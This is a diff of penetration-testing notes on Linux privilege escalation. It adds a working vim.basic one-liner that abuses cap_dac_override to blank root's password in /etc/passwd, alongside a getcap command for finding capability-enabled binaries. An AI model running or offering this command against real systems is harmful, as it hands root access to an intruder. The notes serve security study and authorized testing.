@@ -870,14 +870,18 @@ kali@kali:sudo machinectl remove MACHINE_NAME
 ```
 ### Priviledged Groups
 https://www.drakeaxelrod.com/notes/linux/privileged-groups
-### CAP_SETUID capability
-The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted
+### Abusing Capability  
 ```
 /usr/sbin/getcap -r / 2>/dev/null
 ```
+###### Exploiting CAP_SETUID
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/d14b5115-a1a3-45fd-a23a-c4823198184f)
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/e7e8b730-4760-4848-849e-394aaca5c74e)
-
+###### Exploiting cap_dac_override on vim.basic
+```
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+$ cat /etc/passwd | head -n1 (Now we can use the command su to log in as root without being asked for the password)
+```
 ### Cronjob to elevate privilege
 1. Always remember to check if the file has executable perm when cron job runs it, otherwise even root runs it, doesn't execute the file
 2. If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the /etc/crontab file
